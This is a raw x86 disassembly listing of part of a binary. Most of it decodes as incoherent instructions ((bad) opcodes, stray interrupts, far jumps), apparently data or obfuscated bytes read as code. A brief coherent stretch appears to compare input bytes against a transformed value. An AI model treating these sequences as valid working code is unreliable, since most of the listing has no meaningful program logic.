  410a9f:	ficom  DWORD PTR [ebp+ebx*8+0x1e334c7b]
  410aa6:	ret    
  410aa7:	cmp    ecx,ecx
  410aa9:	jne    0x410abd
  410aab:	mov    dl,0x2f
  410aad:	xchg   ebp,eax
  410aae:	fst    QWORD PTR [edi]
  410ab0:	das    
  410ab1:	andps  xmm2,XMMWORD PTR [esi+ebp*2-0x1e7cde45]
  410ab9:	dec    edx
  410aba:	je     0x410af4
  410abc:	shl    DWORD PTR [eax+eiz*4+0x76],cl
  410ac0:	add    DWORD PTR [esi+esi*4+0x26b8203c],esp
  410ac7:	jo     0x410ad7
  410ac9:	and    si,WORD PTR [eax+eax*1+0xa]
  410ace:	hlt    
  410acf:	int    0x96
  410ad1:	adc    DWORD PTR [ecx+0x3e],esi
  410ad4:	(bad)  
  410ad5:	retf   
  410ad6:	pop    edx
  410ad7:	xor    BYTE PTR [bx+si+0x5092],ah
  410adc:	int    0x9e
  410ade:	mov    edi,ss
  410ae0:	pusha  
  410ae1:	inc    edi
  410ae2:	ja     0x410a7c
  410ae4:	mov    bl,0x13
  410ae6:	in     eax,dx
  410ae7:	stos   BYTE PTR es:[edi],al
  410ae8:	mov    dh,0xf2
  410aea:	loop   0x410aa0
  410aec:	imul   edi,esi,0xb285ba83
  410af2:	jne    0x410b5a
  410af4:	mov    ch,0x60
  410af6:	sbb    BYTE PTR [edi-0x4bb68e2c],ch
  410afc:	mov    ebx,0xd7428b60
  410b01:	dec    ebx
  410b02:	jmp    0x410b5e
  410b04:	data16 mov cl,0x41
  410b07:	and    ebx,DWORD PTR [ebp+0x63]
  410b0a:	popa   
  410b0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b0c:	imul   edx,esp,0x6b5b7838
  410b12:	inc    esi
  410b13:	fs adc eax,0xcabaceda
  410b19:	push   0x675a5909
  410b1e:	(bad)  
  410b1f:	mov    al,ds:0xba104600
  410b24:	push   ebx
  410b25:	jmp    0xf336:0x7084fc9c
  410b2c:	sar    DWORD PTR [edx-0x258a5a8f],0x12
  410b33:	jmp    ecx
  410b35:	aam    0x35
  410b37:	das    
  410b38:	(bad)  
  410b39:	dec    edx
  410b3a:	push   eax
  410b3b:	adc    cl,BYTE PTR [edi+0x43871c29]
  410b41:	arpl   WORD PTR [esi-0x330ff176],dx
  410b47:	mov    eax,0x357a0dd5
  410b4c:	adc    DWORD PTR [edx+0x18],ebx
  410b4f:	xor    dl,BYTE PTR [eax-0x24]
  410b52:	pop    eax
  410b53:	mov    esp,0xa115475f
  410b58:	or     edx,DWORD PTR [ecx+0xdfa1482]
  410b5e:	imul   ebp,DWORD PTR [edi],0xfffffff0
  410b61:	fild   DWORD PTR [ebx]
  410b63:	outs   dx,DWORD PTR ds:[esi]
  410b64:	xchg   bh,dl
  410b66:	sbb    DWORD PTR ds:0x98c1765,esi
  410b6c:	mov    ds,edi
  410b6e:	mov    dh,0x7d
  410b70:	mov    ds:0xaab071e4,al
  410b75:	xchg   edx,eax
  410b76:	sar    bl,1
  410b78:	outs   dx,BYTE PTR ds:[esi]
  410b79:	dec    eax
  410b7a:	xchg   esi,eax
  410b7b:	jl     0x410b95
  410b7d:	inc    esi
  410b7e:	add    BYTE PTR [eax+0x12],bl
  410b81:	push   ds
  410b82:	jmp    0x410b04
  410b84:	push   edi
  410b85:	rol    DWORD PTR [edi+ecx*2-0x357698a1],1
  410b8c:	adc    esi,DWORD PTR [edx-0x48]
  410b8f:	mov    ch,0xce
  410b91:	gs ss dec ecx
  410b94:	xor    DWORD PTR [edx-0x7d],ecx
  410b97:	jnp    0x410beb
  410b99:	xchg   edi,eax
  410b9a:	(bad)  
  410b9b:	hlt    
  410b9c:	or     DWORD PTR [edi-0xb085c11],esi
  410ba2:	dec    DWORD PTR [edi+0x28]
  410ba5:	in     eax,0x98
  410ba7:	fs jbe 0x410b4d
  410baa:	retf   0x6750
  410bad:	icebp  
  410bae:	daa    
  410baf:	std    
  410bb0:	mov    dh,BYTE PTR [ebp+edx*4+0x24e5357]
  410bb7:	test   BYTE PTR [ebx+eiz*4],0x5f
  410bbb:	ret    0x63d5
  410bbe:	(bad)  
  410bbf:	cmp    DWORD PTR [esi],ebx
  410bc1:	pop    es
  410bc2:	sub    eax,0x2b920343
  410bc7:	mov    dl,0xf1
  410bc9:	mov    ah,0xc
  410bcb:	pushf  
  410bcc:	mov    bl,0x95
  410bce:	xchg   esi,eax
  410bcf:	mov    dl,0x44
  410bd1:	add    eax,0x37
  410bd4:	fst    DWORD PTR [ebx]
  410bd6:	inc    eax
  410bd7:	mov    ebp,0xb3b576f5
  410bdc:	mov    cl,0xc1
  410bde:	jbe    0x410bbd
  410be0:	loope  0x410bde
  410be2:	xchg   esp,eax
  410be3:	mov    esi,0xcc5e4fc8
  410be8:	xchg   DWORD PTR [edx+0x7e650a9d],ecx
  410bee:	pop    ds
  410bef:	cmc    
  410bf0:	ret    
  410bf1:	mov    bl,0x80
  410bf3:	sub    al,0x1e
  410bf5:	aad    0x8b
  410bf7:	call   0x9105:0x515e6d2f
  410bfe:	cs xchg ebx,eax
  410c00:	arpl   ax,dx
  410c02:	lea    ecx,[eax]
  410c04:	mov    al,0x85
  410c06:	xchg   ecx,eax
  410c07:	pop    ebp
  410c08:	test   DWORD PTR [esi],ebx
  410c0a:	inc    ebx
  410c0b:	push   0x24
  410c0d:	(bad)  
  410c0e:	aam    0x95
  410c10:	in     al,0x1d
  410c12:	push   0x58a3e0fc
  410c17:	mov    al,0xe4
  410c19:	test   eax,0x4e0794b
  410c1e:	(bad)  [edi+0xa7027da]
  410c24:	arpl   WORD PTR [edi],bx
  410c26:	xor    edi,DWORD PTR [edi-0x2cd750e4]
  410c2c:	mov    dl,0x9e
  410c2e:	pop    ds
  410c2f:	inc    ecx
  410c30:	mov    al,cs:0x590c8ff4
  410c36:	outs   dx,DWORD PTR ds:[esi]
  410c37:	mov    dh,0x39
  410c39:	(bad)  
  410c3a:	test   eax,0xd54b4f05
  410c3f:	jl     0x410c1a
  410c41:	jns    0x410cad
  410c43:	call   DWORD PTR [edi]
  410c45:	jg     0x410c1f
  410c47:	sbb    DWORD PTR [edx+0x494cbacd],0x81a6c6b8
  410c51:	and    DWORD PTR [edi+0x6c4dbd2],esi
  410c57:	rcl    BYTE PTR [ecx-0x8],1
  410c5a:	mov    WORD PTR [edi],cs
  410c5c:	sbb    eax,0xe2030791
  410c61:	cmp    al,0x51
  410c63:	mov    ch,0x45
  410c65:	mov    al,0x81
  410c67:	loopne 0x410ca3
  410c69:	ds je  0x410c57
  410c6c:	push   ebx
  410c6d:	pusha  
  410c6e:	dec    esi
  410c6f:	jo     0x410c48
  410c71:	dec    esp
  410c72:	out    0xd5,eax
  410c74:	inc    ecx
  410c75:	ds push ebp
  410c77:	cmp    ebx,eax
  410c79:	pop    ss
  410c7a:	es stc 
  410c7c:	jo     0x410cb1
  410c7e:	aam    0x85
  410c80:	loop   0x410cb3
  410c82:	int3   
  410c83:	bound  ebx,QWORD PTR [eax-0x79]
  410c86:	mov    cl,0x2a
  410c88:	std    
  410c89:	mov    DWORD PTR [ecx+0x29404073],eax
  410c8f:	mov    esi,0x178a754f
  410c94:	or     ebx,eax
  410c96:	adc    esp,DWORD PTR [edx+0x77]
  410c99:	enter  0xe71,0x4a
  410c9d:	adc    al,0xad
  410c9f:	into   
  410ca0:	cmp    bl,bl
  410ca2:	clc    
  410ca3:	mov    ecx,0x874f0045
  410ca8:	ror    bl,0x93
  410cab:	nop
  410cac:	cmp    ebx,eax
  410cae:	cli    
  410caf:	xlat   BYTE PTR ds:[ebx]
  410cb0:	adc    esi,0x23
  410cb3:	lds    ecx,FWORD PTR [ecx+esi*2]
  410cb6:	fidivr WORD PTR [edx]
  410cb8:	addr16 mov cl,0x30
  410cbb:	mov    ds:0x3700cce1,eax
  410cc0:	or     eax,0x2bf499d4
  410cc5:	retf   
  410cc6:	or     al,0xe3
  410cc8:	jmp    DWORD PTR [esi+ecx*4]
  410ccb:	pusha  
  410ccc:	ret    
  410ccd:	sahf   
  410cce:	push   0xffffff9c
  410cd0:	xchg   esi,eax
  410cd1:	cmp    eax,0x66a3f9d7
  410cd6:	push   ebp
  410cd7:	icebp  
  410cd8:	fs add eax,0x5b03d1b4
  410cde:	pop    esi
  410cdf:	mov    bh,0xb1
  410ce1:	mov    edx,DWORD PTR [edx-0x2bf194e1]
  410ce7:	repnz mov ds:0x499a6863,al
  410ced:	mov    esi,0xa39b227f
  410cf2:	mov    edx,0xb94c1f7e
  410cf7:	dec    edi
  410cf8:	lds    esi,FWORD PTR [ebp-0x75]
  410cfb:	push   eax
  410cfc:	push   ss
  410cfd:	ds cwde 
  410cff:	out    0xbe,eax
  410d01:	xlat   BYTE PTR ds:[ebx]
  410d02:	mov    BYTE PTR [edi+0x7f6a3832],0x64
  410d09:	(bad)  
  410d0b:	inc    esp
  410d0c:	mov    DWORD PTR [edx],eax
  410d0e:	mov    eax,DWORD PTR [ebp-0x8]
  410d11:	jmp    0x410fdf
  410d16:	je     0x410d40
  410d18:	(bad)  
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x1c5f379c
  410d25:	outs   dx,BYTE PTR ds:[esi]
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d75
  410d2f:	mov    esp,0x48fe2dd4
  410d34:	pop    ebp
  410d35:	icebp  
  410d36:	fst    DWORD PTR [ecx-0x6e767acc]
  410d3c:	iret   
  410d3d:	pop    esi
  410d3e:	pop    eax
  410d3f:	pusha  
  410d40:	sub    BYTE PTR [ecx+edx*8+0x6],bl
  410d44:	out    dx,al
  410d45:	stos   DWORD PTR es:[edi],eax
  410d46:	sub    DWORD PTR gs:0xe3340237,ebx
  410d4d:	mov    ebx,0xf7c868a1
  410d52:	cli    
  410d53:	mov    ebx,0x65ec0be2
  410d58:	rcl    DWORD PTR [ecx],cl
  410d5a:	dec    edi
  410d5b:	repnz lods al,BYTE PTR ds:[esi]
  410d5d:	in     al,0x3a
  410d5f:	dec    edi
  410d60:	mov    edx,0xe7b20918
  410d65:	dec    esi
  410d66:	inc    edi
  410d67:	push   ds
  410d68:	cmp    dl,BYTE PTR [edi-0x28]
  410d6b:	pop    eax
  410d6c:	test   DWORD PTR [eax],0x3c05da29
  410d72:	shl    BYTE PTR [ecx+0x61],cl
  410d75:	repz pop esi
  410d77:	fisubr WORD PTR [ecx+0x250f7e11]
  410d7d:	aaa    
  410d7e:	dec    ebx
  410d7f:	mov    ds:0x9561fec2,al
  410d84:	adc    BYTE PTR ds:0x4affeb5b,ah
  410d8a:	fwait
  410d8b:	push   cs
  410d8c:	jmp    0xf990:0xe9cc1b22
  410d93:	and    BYTE PTR [eax*8-0x3183a4a4],bh
  410d9a:	pop    eax
  410d9b:	or     al,0x1e
  410d9d:	scas   eax,DWORD PTR es:[edi]
  410d9e:	xor    BYTE PTR [edx-0x5d],ch
  410da1:	xor    BYTE PTR [ecx-0x54a5665f],al
  410da7:	adc    edi,ebp
  410da9:	call   0xfc5:0xc774d340
  410db0:	fs nop
  410db2:	scas   al,BYTE PTR es:[edi]
  410db3:	ins    DWORD PTR es:[edi],dx
  410db4:	sub    DWORD PTR [ebp+eiz*4-0x1fc59874],ebx
  410dbb:	cli    
  410dbc:	arpl   WORD PTR [edi],si
  410dbe:	push   0x13
  410dc0:	and    esi,DWORD PTR [edx+eax*2+0x5f]
  410dc4:	ins    BYTE PTR es:[edi],dx
  410dc5:	xor    eax,0xc2ded0fc
  410dca:	div    BYTE PTR [eax+0x21]
  410dcd:	jmp    edx
  410dcf:	sbb    DWORD PTR [ebp+0x2a084f9d],edx
  410dd5:	lods   al,BYTE PTR ds:[esi]
  410dd6:	push   cs
  410dd7:	(bad)  
  410dd9:	cs out 0x6,eax
  410ddc:	pop    esp
  410ddd:	jecxz  0x410e00
  410ddf:	sbb    dl,BYTE PTR [edx-0x5f02d1a0]
  410de5:	inc    edi
  410de6:	cmp    BYTE PTR ds:0x5959d676,0xb9
  410ded:	bound  ebx,QWORD PTR [edi+0x196db931]
  410df3:	fsubr  st(3),st
  410df5:	loop   0x410e67
  410df7:	outs   dx,DWORD PTR ds:[esi]
  410df8:	or     dh,BYTE PTR [edi-0x7b]
  410dfb:	jle    0x410e4e
  410dfd:	xchg   DWORD PTR [eax],edi
  410dff:	test   ah,cl
  410e01:	mov    ds:0x377c353d,eax
  410e06:	inc    ecx
  410e07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e08:	icebp  
  410e09:	pop    ds
  410e0a:	inc    ecx
  410e0b:	xchg   edx,eax
  410e0c:	cmp    al,0xa3
  410e0e:	dec    esi
  410e0f:	jbe    0x410dc9
  410e11:	je     0x410e63
  410e13:	fwait
  410e14:	push   0xf99dc4cf
  410e19:	xor    bl,BYTE PTR [ecx+0x25]
  410e1c:	or     al,0xe
  410e1e:	and    dl,BYTE PTR [edi-0x11]
  410e21:	and    esi,DWORD PTR [ebx+0x3ff0a8]
  410e27:	inc    esi
  410e28:	in     eax,dx
  410e29:	in     al,dx
  410e2a:	xchg   BYTE PTR [eax+0xdf32eb9],al
  410e30:	iret   
  410e31:	pushf  
  410e32:	(bad)  
  410e34:	pop    ebx
  410e35:	mov    esi,0x98ef330d
  410e3a:	(bad)  
  410e3b:	mov    BYTE PTR [edx-0x4e],0x4f
  410e3f:	inc    ebx
  410e40:	das    
  410e41:	jmp    0x3811:0xa391ff14
  410e48:	dec    ebp
  410e49:	pop    ebx
  410e4a:	(bad)
  410e4d:	cmp    esp,ebp
  410e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e50:	stc    
  410e51:	xchg   ecx,eax
  410e52:	pushf  
  410e53:	(bad)  
  410e54:	adc    bh,BYTE PTR [edx-0x5c]
  410e57:	test   bl,dl
  410e59:	jle    0x410ec2
  410e5b:	xor    esi,DWORD PTR [ecx+0x0]
  410e5e:	xchg   DWORD PTR [ebx-0x7],ebp
  410e61:	(bad)  
  410e62:	out    dx,al
  410e63:	pop    esi
  410e64:	jno    0x410e48
  410e66:	imul   esp,eax,0x38
  410e69:	or     al,0xf2
  410e6b:	test   BYTE PTR [edx-0x45],bh
  410e6e:	mov    ?,WORD PTR [esi+edx*4]
  410e71:	xchg   edx,eax
  410e72:	pop    ss
  410e73:	cmp    DWORD PTR [eax-0x2f734d2],ebx
  410e79:	aas    
  410e7a:	pusha  
  410e7b:	outs   dx,DWORD PTR ds:[esi]
  410e7c:	mov    bl,0x77
  410e7e:	fs hlt 
  410e80:	push   esi
  410e81:	loopne 0x410e31
  410e83:	gs popa 
  410e85:	es pop ss
  410e87:	stos   DWORD PTR es:[edi],eax
  410e88:	xchg   ecx,esp
  410e8a:	std    
  410e8b:	(bad)  [edx+ebx*2]
  410e8e:	fwait
  410e8f:	cmp    eax,ebp
  410e91:	in     eax,dx
  410e92:	icebp  
  410e93:	inc    esp
  410e94:	outs   dx,BYTE PTR ds:[esi]
  410e95:	inc    ebx
  410e96:	mov    al,ds:0xbfa6bae3
  410e9b:	adc    eax,0x9d6731d6
  410ea0:	nop
  410ea1:	cmp    DWORD PTR [edi-0x34],esp
  410ea4:	push   eax
  410ea5:	xchg   eax,eax
  410ea7:	pop    edi
  410ea8:	and    al,0x98
  410eaa:	fcom   DWORD PTR [ebx+0x40d49855]
  410eb0:	shl    DWORD PTR [esi+ebp*1-0x22],1
  410eb4:	int    0x8d
  410eb6:	adc    ah,dh
  410eb8:	pop    ecx
  410eb9:	push   ebp
  410eba:	xchg   ebx,eax
  410ebb:	fcomp  DWORD PTR [esi-0x42]
  410ebe:	into   
  410ebf:	jmp    0x410ed1
  410ec1:	pop    ebx
  410ec2:	pop    esp
  410ec3:	ins    BYTE PTR es:[edi],dx
  410ec4:	pop    edx
  410ec5:	ror    eax,cl
  410ec7:	or     ah,BYTE PTR [ecx+ebp*8]
  410eca:	cld    
  410ecb:	jbe    0x410f2e
  410ecd:	jo     0x410f0b
  410ecf:	sub    eax,0xf840120f
  410ed4:	lea    ebp,[edx+0xd]
  410ed7:	int3   
  410ed8:	pop    edx
  410ed9:	daa    
  410eda:	ja     0x410f01
  410edc:	mov    bl,0x2c
  410ede:	(bad)  
  410ee0:	ret    
  410ee1:	rcl    DWORD PTR [eax-0x4e],0xa7
  410ee5:	scas   eax,DWORD PTR es:[edi]
  410ee6:	adc    al,0xf7
  410ee8:	jno    0x410ec3
  410eea:	jns    0x410ec9
  410eec:	iret   
  410eed:	lock sbb BYTE PTR [edx+0x127fab9d],0xa8
  410ef5:	adc    eax,0x84962786
  410efa:	ins    BYTE PTR es:[edi],dx
  410efb:	jp     0x410ee5
  410efd:	add    bh,BYTE PTR ds:0x3a5350c2
  410f03:	dec    esp
  410f04:	mov    ds:0xf4988cea,al
  410f09:	clc    
  410f0a:	pop    ebx
  410f0b:	ror    eax,1
  410f0d:	inc    ebp
  410f0e:	push   ebx
  410f0f:	push   edx
  410f10:	push   edx
  410f11:	jae    0x410ef7
  410f13:	xchg   esp,eax
  410f14:	xor    DWORD PTR [edi+0x2f0bc478],ecx
  410f1a:	aam    0xcf
  410f1c:	in     al,dx
  410f1d:	cmp    DWORD PTR [esi+0x3f09a222],edx
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	paddsw mm4,mm6
  410f27:	pop    edi
  410f28:	dec    eax
  410f29:	adc    eax,0xd2aec783
  410f2e:	lahf   
  410f2f:	aas    
  410f30:	xchg   ebp,eax
  410f31:	sub    al,0x80
  410f33:	aad    0xfa
  410f35:	es pop cx
  410f38:	out    dx,eax
  410f39:	xlat   BYTE PTR ds:[ebx]
  410f3a:	(bad)  
  410f3b:	or     al,BYTE PTR [edi+0x12]
  410f3e:	jecxz  0x410f07
  410f40:	adc    al,0x66
  410f42:	scas   al,BYTE PTR es:[edi]
  410f43:	test   BYTE PTR [edi-0xa],dl
  410f46:	jmp    0x336b:0x198ad9a1
  410f4d:	adc    al,0x4e
  410f4f:	test   dh,cl
  410f51:	mov    esi,0xd46416b3
  410f56:	sahf   
  410f57:	frstor [ecx+0x5]
  410f5a:	rcl    BYTE PTR [ecx],cl
  410f5c:	sub    BYTE PTR [edi+0x41116bfd],0x3a
  410f63:	int    0xe4
  410f65:	test   BYTE PTR [ebx],bh
  410f67:	ficom  DWORD PTR [eax-0x32e48318]
  410f6d:	inc    edi
  410f6e:	arpl   cx,bp
  410f70:	mov    al,0xfa
  410f72:	test   BYTE PTR [ecx+ebx*2+0x599ba33f],al
  410f79:	xchg   ebx,eax
  410f7a:	jne    0x410fe9
  410f7c:	fsubr  DWORD PTR [edx+0x7c1d21b0]
  410f82:	or     cl,ch
  410f84:	outs   dx,BYTE PTR ds:[esi]
  410f85:	stc    
  410f86:	js     0x410fe5
  410f88:	loop   0x410f70
  410f8a:	pop    edi
  410f8b:	inc    esp
  410f8c:	adc    eax,0x3a6ea84b
  410f91:	sub    edx,eax
  410f93:	lods   al,BYTE PTR ds:[esi]
  410f94:	fstp   TBYTE PTR [ebx]
  410f96:	shl    DWORD PTR [ecx-0x1c],cl
  410f99:	out    dx,al
  410f9a:	div    BYTE PTR es:[ebx]
  410f9d:	int    0x17
  410f9f:	mov    dh,0xb0
  410fa1:	inc    esi
  410fa2:	in     al,dx
  410fa3:	jmp    0x410f29
  410fa5:	in     eax,0x62
  410fa7:	fsub   DWORD PTR [esi-0x2468003b]
  410fad:	ja     0x410f5f
  410faf:	cmp    ebp,DWORD PTR [edi+eiz*4+0x54]
  410fb3:	outs   dx,DWORD PTR ds:[esi]
  410fb4:	jl     0x41101d
  410fb6:	lock out dx,al
  410fb8:	cdq    
  410fb9:	div    esp
  410fbb:	out    dx,eax
  410fbc:	lock pop eax
  410fbe:	ins    BYTE PTR es:[edi],dx
  410fbf:	es jl  0x410fb3
  410fc2:	push   0x95004576
  410fc7:	mov    al,ds:0x8c12185f
  410fcc:	ss ins BYTE PTR es:[edi],dx
  410fce:	sar    eax,1
  410fd0:	dec    edx
  410fd1:	(bad)  
  410fd2:	ror    bh,1
  410fd4:	retf   0xb860
  410fd7:	mov    WORD PTR [ecx-0x23],gs
  410fda:	dec    esi
  410fdb:	inc    esp
  410fdc:	iret   
  410fdd:	inc    ebp
  410fde:	nop
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x4110a1
  41102b:	pop    edi
  41102c:	pop    edi
  41102d:	loopne 0x411047
  41102f:	inc    edi
  411030:	jle    0x4110b0
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x411042
  411037:	mov    bl,0x75
  411039:	lods   al,BYTE PTR ds:[esi]
  41103a:	jmp    0x41102e
  41103c:	ror    BYTE PTR [edi+0x64a8fa50],1
  411042:	call   0x31cd2a2e
  411047:	xchg   ecx,eax
  411048:	push   ecx
  411049:	(bad)  
  41104a:	aad    0x51
  41104c:	sahf   
  41104d:	std    
  41104e:	hlt    
  41104f:	cmp    BYTE PTR [edx-0x780964db],0x1
  411056:	sub    edi,ebx
  411058:	shr    DWORD PTR [ecx],cl
  41105a:	cli    
  41105b:	retf   0xc256
  41105e:	sub    edi,DWORD PTR [ebx]
  411060:	das    
  411061:	sbb    DWORD PTR [edx+0x32cafe88],ebp
  411067:	aad    0xe4
  411069:	mov    dl,0x8c
  41106b:	dec    eax
  41106c:	dec    esi
  41106d:	clc    
  41106e:	xchg   edi,eax
  41106f:	sbb    DWORD PTR [ecx],eax
  411071:	adc    al,0x28
  411073:	mov    bl,BYTE PTR [edi+0x6d]
  411076:	hlt    
  411077:	mov    ecx,0xd7392cc3
  41107c:	add    esp,ecx
  41107e:	stc    
  41107f:	jbe    0x411008
  411081:	jns    0x4110eb
  411083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411084:	iret   
  411085:	pop    edi
  411086:	sbb    al,0x75
  411088:	(bad)  
  411089:	into   
  41108a:	addr16 mov ecx,0x8b6f35c
  411090:	shr    DWORD PTR ds:0xdefc92d2,1
  411096:	out    0x38,eax
  411098:	lods   al,BYTE PTR ds:[esi]
  411099:	outs   dx,DWORD PTR fs:[esi]
  41109b:	cli    
  41109c:	xor    al,0x11
  41109e:	imul   edi,ebx,0x7d
  4110a1:	(bad)  
  4110a2:	shl    BYTE PTR [edi+edi*8-0xa],1
  4110a6:	sub    eax,0xdfd6f911
  4110ab:	mov    ebp,0x4ea45969
  4110b0:	fnstenv [ebx]
  4110b2:	push   esp
  4110b3:	cwde   
  4110b4:	pop    ebx
  4110b5:	repnz imul eax,ecx,0xa
  4110b9:	xor    eax,0xb7c613ed
  4110be:	sbb    bh,BYTE PTR [esi+0x705831a1]
  4110c4:	pop    ecx
  4110c5:	push   esi
  4110c6:	and    al,0xa1
  4110c8:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ca:	aas    
  4110cb:	or     DWORD PTR [edi-0x6c],esp
  4110ce:	retf   
  4110cf:	fist   WORD PTR [esi-0x7e]
  4110d2:	mov    dh,0xcb
  4110d4:	ret    0x4e54
  4110d7:	jge    0x4110f3
  4110d9:	inc    ebp
  4110da:	sar    cl,0x12
  4110dd:	pop    eax
  4110de:	jnp    0x4110ce
  4110e0:	adc    eax,0x431a5cc0
  4110e5:	mov    ds:0xca229aec,eax
  4110ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110eb:	mov    WORD PTR [ebx],es
  4110ed:	jae    0x4110f3
  4110ef:	cmp    ah,0x77
  4110f2:	dec    esi
  4110f3:	or     ah,bl
  4110f5:	outs   dx,BYTE PTR ds:[esi]
  4110f6:	pop    edi
  4110f7:	pop    es
  4110f8:	mov    eax,ds:0x2b77c4b2
  4110fd:	outs   dx,BYTE PTR ds:[esi]
  4110fe:	cmovp  edx,DWORD PTR [esi-0x17]
  411102:	xchg   ecx,eax
  411103:	push   0x8b545287
  411108:	mov    ds:0xb97509ff,al
  41110d:	cmp    bl,al
  41110f:	test   dl,cl
  411111:	pop    ds
  411112:	test   al,0x8d
  411114:	out    0x53,eax
  411116:	cli    
  411117:	adc    esp,DWORD PTR [edi-0x275bed00]
  41111d:	pop    esi
  41111e:	xor    eax,0x8a4c56d7
  411123:	(bad)  
  411124:	(bad)  
  411125:	and    BYTE PTR [ebx],bl
  411127:	popa   
  411128:	push   ds
  411129:	mov    ds:0x28ce1ba5,eax
  41112e:	adc    eax,0xe9af9fc8
  411133:	loope  0x4110db
  411135:	pop    ds
  411136:	fcomip st,st(3)
  411138:	jmp    0x68b:0x6deb5745
  41113f:	or     al,0x89
  411141:	call   0xa78c:0xfe640244
  411148:	ss js  0x4111c6
  41114b:	adc    BYTE PTR [ecx+0x30297d2b],bl
  411151:	jnp    0x411132
  411153:	out    0x58,eax
  411155:	fwait
  411156:	iret   
  411157:	add    BYTE PTR [eax],ah
  411159:	and    dh,BYTE PTR [edi+0x7a]
  41115c:	sbb    edx,DWORD PTR [edi+0x3d]
  41115f:	dec    ebx
  411160:	push   0xffffff95
  411162:	outs   dx,DWORD PTR ds:[esi]
  411163:	push   ebx
  411164:	add    eax,0xdb27cace
  411169:	aas    
  41116a:	aam    0xbb
  41116c:	sub    eax,0x5ec4f28e
  411171:	xlat   BYTE PTR ds:[ebx]
  411172:	das    
  411173:	xchg   ecx,eax
  411174:	cmp    dl,BYTE PTR ds:0xb3e6bd1c
  41117a:	pop    edi
  41117b:	sbb    DWORD PTR [ecx],edx
  41117d:	add    DWORD PTR [ebp-0x3a80811c],ebx
  411183:	ret    
  411184:	ror    bh,0xc8
  411187:	jecxz  0x411208
  411189:	lods   al,BYTE PTR ds:[esi]
  41118a:	fcom   DWORD PTR [ebx-0x7]
  41118d:	jg     0x411177
  41118f:	push   ebx
  411190:	mov    ebp,0x9f383168
  411195:	test   edi,0x83a6cb99
  41119b:	repnz inc ecx
  41119d:	dec    esi
  41119e:	sub    DWORD PTR [edx],0x3c6e040e
  4111a4:	mov    ch,BYTE PTR [esi+0x71c99403]
  4111aa:	mov    ebx,0x25f3841b
  4111af:	ret    0xad6d
  4111b2:	stos   BYTE PTR es:[edi],al
  4111b3:	cmp    DWORD PTR [esp+esi*4+0x71fdd247],eax
  4111ba:	ins    BYTE PTR es:[edi],dx
  4111bb:	gs data16 mov dl,0xf2
  4111bf:	xchg   ecx,eax
  4111c0:	mov    dh,0x5c
  4111c2:	push   eax
  4111c3:	outs   dx,DWORD PTR ds:[esi]
  4111c4:	mov    ch,0x67
  4111c6:	test   al,0x8f
  4111c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111c9:	test   eax,0x4478d95d
  4111ce:	dec    esi
  4111cf:	inc    eax
  4111d0:	cmp    cl,BYTE PTR [edi-0x39]
  4111d3:	(bad)  
  4111d5:	jecxz  0x4111f9
  4111d7:	sahf   
  4111d8:	pop    ebp
  4111d9:	sub    cl,BYTE PTR [eax]
  4111db:	push   ebx
  4111dc:	pop    edi
  4111dd:	data16 rcl BYTE PTR [ebp-0x59],cl
  4111e1:	call   ebx
  4111e3:	rcl    BYTE PTR [esi+0x394919a5],cl
  4111e9:	adc    al,0xb2
  4111eb:	jnp    0x411230
  4111ed:	fnstsw ax
  4111ef:	imul   ebp,DWORD PTR [edi+0x4cab544d],0x4fa58dba
  4111f9:	lods   al,BYTE PTR ds:[esi]
  4111fa:	ja     0x41120f
  4111fc:	xchg   BYTE PTR [eax+0x10dae16e],al
  411202:	sub    esp,DWORD PTR [ecx+0x41]
  411205:	fs pop ss
  411207:	pusha  
  411208:	cmp    DWORD PTR [eax-0x5a],eax
  41120b:	shr    DWORD PTR ds:0xf5c12dc7,0x52
  411212:	adc    bl,BYTE PTR [ebp+0x1cb58058]
  411218:	shl    edx,1
  41121a:	add    al,0x98
  41121c:	add    DWORD PTR [edi+0x40],0x6d
  411220:	pop    edi
  411221:	push   0x32099d5b
  411226:	pop    eax
  411227:	adc    eax,0x1871cc8b
  41122c:	inc    ecx
  41122d:	pop    esi
  41122e:	neg    BYTE PTR [ebx-0x42]
  411231:	mov    ecx,0xe2231633
  411236:	pushf  
  411237:	mov    ecx,0x78a83edb
  41123c:	test   eax,0xb0d8b7f7
  411241:	sbb    eax,0xa6382c07
  411246:	es add al,0x36
  411249:	mov    eax,0x76040063
  41124e:	mov    al,ds:0x76dfe8e3
  411253:	enter  0x5f0f,0xe1
  411257:	pop    esi
  411258:	mov    edx,0x7f8f9f5d
  41125d:	xor    BYTE PTR [edx-0x6a],bh
  411260:	popf   
